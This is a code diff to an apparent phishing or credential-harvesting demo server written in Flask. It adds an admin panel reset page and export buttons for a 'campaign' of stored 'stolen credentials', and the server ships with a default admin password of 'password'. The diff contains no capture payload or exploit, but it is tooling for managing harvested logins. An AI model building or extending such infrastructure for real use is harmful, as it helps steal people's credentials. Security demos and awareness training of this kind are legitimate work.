@@ -218,6 +218,16 @@ def admin_view():
 
     html_response += """
         <hr style="border-color: #444; margin-top: 30px;">
+        <div style="text-align: center; margin: 20px 0;">
+            <button onclick="window.location.href='/admin/reset'" 
+                    style="padding: 10px 20px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; margin: 0 10px;">
+                🗑️ Reset Campaign
+            </button>
+            <button onclick="window.location.href='/admin/export'" 
+                    style="padding: 10px 20px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; margin: 0 10px;">
+                📥 Export Data
+            </button>
+        </div>
         <div style="color: #666; text-align: center; margin-top: 20px;">
             🔒 This data is confidential and for authorized personnel only
         </div>
@@ -250,6 +260,104 @@ def admin_export():
     }), 200
 
 
+@app.route("/admin/reset", methods=["GET", "POST"])
+def admin_reset():
+    """
+    Reset/clear all stolen data (requires password)
+    """
+    if request.method == "GET":
+        # Show reset confirmation form
+        reset_form = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Reset Campaign Data</title>
+            <style>
+                body { font-family: Arial; margin: 50px; background: #f0f0f0; }
+                .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+                input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
+                .btn-danger { width: 100%; padding: 12px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 5px 0; }
+                .btn-danger:hover { background: #c82333; }
+                .btn-secondary { width: 100%; padding: 12px; background: #6c757d; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 5px 0; }
+                .btn-secondary:hover { background: #5a6268; }
+                .warning { color: #dc3545; font-size: 14px; margin: 15px 0; padding: 10px; background: #f8d7da; border-radius: 5px; }
+                .info { color: #0c5460; font-size: 14px; margin: 15px 0; padding: 10px; background: #d1ecf1; border-radius: 5px; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h2>🗑️ Reset Campaign Data</h2>
+
+                <div class="info">
+                    📊 This will permanently delete all collected credentials from both the server and the JSON file.
+                </div>
+
+                <div class="warning">
+                    ⚠️ WARNING: This action cannot be undone!<br>
+                    All stolen credentials will be permanently lost.
+                </div>
+
+                <form method="POST">
+                    <label>Enter Admin Password to Confirm:</label>
+                    <input type="password" name="password" required>
+                    <button type="submit" class="btn-danger">🗑️ DELETE ALL DATA</button>
+                </form>
+
+                <button onclick="window.location.href='/admin/view'" class="btn-secondary">← Back to Admin Panel</button>
+            </div>
+        </body>
+        </html>
+        """
+        return reset_form
+
+    # Handle POST request
+    password = request.form.get('password', '')
+
+    if not verify_admin_password(password):
+        return jsonify({"error": "Invalid password"}), 401
+
+    # Clear all data
+    try:
+        # Save empty array to file
+        save_stolen_data([])
+
+        success_message = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Reset Complete</title>
+            <style>
+                body { font-family: Arial; margin: 50px; background: #f0f0f0; }
+                .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+                .success { color: #155724; font-size: 16px; margin: 15px 0; padding: 15px; background: #d4edda; border-radius: 5px; }
+                .btn-primary { padding: 12px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px 5px; }
+                .btn-primary:hover { background: #0056b3; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h2>✅ Reset Complete</h2>
+                <div class="success">
+                    🧹 All campaign data has been successfully deleted!<br><br>
+                    📁 JSON file cleared<br>
+                    💾 Server memory cleared<br><br>
+                    Your campaign is now ready for a fresh start.
+                </div>
+                <button onclick="window.location.href='/admin/view'" class="btn-primary">Return to Admin Panel</button>
+                <button onclick="window.location.href='/'" class="btn-primary">Back to Home</button>
+            </div>
+        </body>
+        </html>
+        """
+
+        print(f"[Demo-Server] 🧹 All data cleared by admin")
+        return success_message
+
+    except Exception as e:
+        print(f"[Demo-Server] ❌ Failed to clear data: {e}")
+        return jsonify({"error": "Failed to clear data"}), 500
+
+
 if __name__ == "__main__":
     # Get PORT value from .env, default to 5000 if not exists
     port = int(os.getenv("SERVER_PORT", 5000))
@@ -263,6 +371,7 @@ if __name__ == "__main__":
         print(f"[Demo-Server] Created data file: {DATA_FILE}")
 
     print(f"[Demo-Server] Admin panel: http://localhost:{port}/admin/view")
+    print(f"[Demo-Server] Reset campaign: http://localhost:{port}/admin/reset")
     print(f"[Demo-Server] Default admin password: 'password'")
 
     # Listen on all addresses (0.0.0.0) so other devices on network can access
